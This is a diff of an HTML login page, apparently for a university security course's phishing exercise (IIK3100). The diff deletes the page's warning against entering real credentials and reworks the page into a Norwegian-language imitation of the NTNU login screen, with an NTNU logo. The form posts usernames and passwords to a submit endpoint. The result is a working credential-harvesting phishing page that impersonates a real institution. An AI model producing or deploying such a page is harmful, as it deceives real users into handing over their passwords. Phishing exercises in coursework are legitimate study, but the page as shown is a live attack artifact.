@@ -1,22 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="no">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IIK3100 Phishing Task</title>
-    <link rel="stylesheet" href="/styles.css">
+    <title>NTNU Login</title>
+    <link rel="stylesheet" href="./styles.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
 </head>
 <body>
 <div class="login-container">
-    <h2>Please don’t enter real credentials. This is for a phishing task in IIK3100.</h2>
+    <div class="login-header">
+        <img src="./images/bannerlogo.png" alt="NTNU Logo" class="ntnu-logo">
+    </div>
     <form action="/api/submit-login" method="POST">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required>
+        <label for="username">Skriv inn brukernavn</label>
+        <input type="text" id="username" name="username" required placeholder="Brukernavn">
 
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required>
+        <label for="password">Skriv inn passord</label>
+        <input type="password" id="password" name="password" placeholder="Passord" required>
 
-        <button type="submit">Log In</button>
+        <p class="forgot-password">Jeg har glemt passordet</p>
+        <p class="other-login">Andre måter å logge seg på</p>
+        <div class="button-container">
+            <button type="submit">Logg på</button>
+        </div>
     </form>
 </div>
 </body>
